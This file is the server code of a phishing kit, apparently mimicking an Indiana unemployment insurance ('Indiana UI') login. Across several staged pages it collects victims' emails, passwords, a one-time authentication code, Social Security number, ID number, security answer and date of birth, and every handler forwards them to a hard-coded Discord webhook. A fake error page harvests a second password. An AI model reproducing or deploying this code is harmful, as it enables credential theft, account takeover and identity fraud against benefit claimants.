const express = require("express");
const bodyParser = require("body-parser");
const { EmbedBuilder, WebhookClient } = require("discord.js");

const webhookClient = new WebhookClient({
  url: "https://discord.com/api/webhooks/1176668617866223717/zR_EhfipDKoWOE-KQyF3g9AulkSyZ9q2h7qiVozYv7kwJkCXvXSVQ71plcyOIxiEl73z",
});

const app = express();

app.set("view engine", "ejs");
app.use(express.static(__dirname + "/public"));
app.use(bodyParser.urlencoded({ extended: false }));

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/auth", (req, res) => {
  res.render("auth");
});

app.get("/personal", (req, res) => {
  res.render("personal");
});

app.post("/", (req, res) => {
  const embed = new EmbedBuilder()
    .setTitle("Indiana UI")
    .setDescription(
      `Result is:
     => USERNAME: ${req.body.email}
  
     => PASSWORD: ${req.body.password}
     `
    )

    .setColor(0x00ffff);

  webhookClient.send({
    content: "Indiana UI",
    username: "Indiana UI",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.render("auth");
});

app.post("/auth", (req, res) => {
  const embed = new EmbedBuilder()
    .setTitle("Indiana UI")
    .setDescription(
      `Result is:
     => USERNAME: ${req.body.email}
  
     => PASSWORD: ${req.body.password}
     `
    )

    .setColor(0x00ffff);

  webhookClient.send({
    content: "Indiana UI",
    username: "Indiana UI",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.render("authCode");
});

app.post("/email", (req, res) => {
  const embed = new EmbedBuilder()
    .setTitle("Indiana UI")
    .setDescription(
      `Result is:
     => EMAIL: ${req.body.email}
  
     => PASSWORD: ${req.body.password}
     `
    )

    .setColor(0x00ffff);

  webhookClient.send({
    content: "Indiana UI",
    username: "Indiana UI",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.render("emailError");
});

app.post("/emailError", (req, res) => {
  const embed = new EmbedBuilder()
    .setTitle("Indiana UI")
    .setDescription(
      `Result is:
     => Email: ${req.body.email}
  
     => PASSWORD: ${req.body.password}
     `
    )

    .setColor(0x00ffff);

  webhookClient.send({
    content: "Indiana UI",
    username: "Indiana UI",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.render("personal");
});

app.post("/personal", (req, res) => {
  const embed = new EmbedBuilder()
    .setTitle("Indiana UI")
    .setDescription(
      `Result is:
     => FIRSTNAME: ${req.body.fName} ${req.body.mName}
  
     => LASTNAME: ${req.body.lName}

     => SUFFIX: ${req.body.suffix}

     => SSN: ${req.body.ssn1}, ${req.body.ssn2}, ${req.body.ssn3}

     => ID NUMBER: ${req.body.id}

     => SECURITY QUESTION: ${req.body.question}

     => SECURITY ANSWER: ${req.body.answer}

     => DOB: ${req.body.dob}

     
     `
    )

    .setColor(0x00ffff);

  webhookClient.send({
    content: "Indiana UI",
    username: "Indiana UI",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.render("complete");
});

app.post("/authCode", (req, res) => {
  const embed = new EmbedBuilder()
    .setTitle("Indiana UI")
    .setDescription(
      `Result is:
     => Code: ${req.body.code}
  
     `
    )

    .setColor(0x00ffff);

  webhookClient.send({
    content: "Indiana UI",
    username: "Indiana UI",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.render("personal");
});

app.listen(3000, () => {
  console.log("app is listening");
});
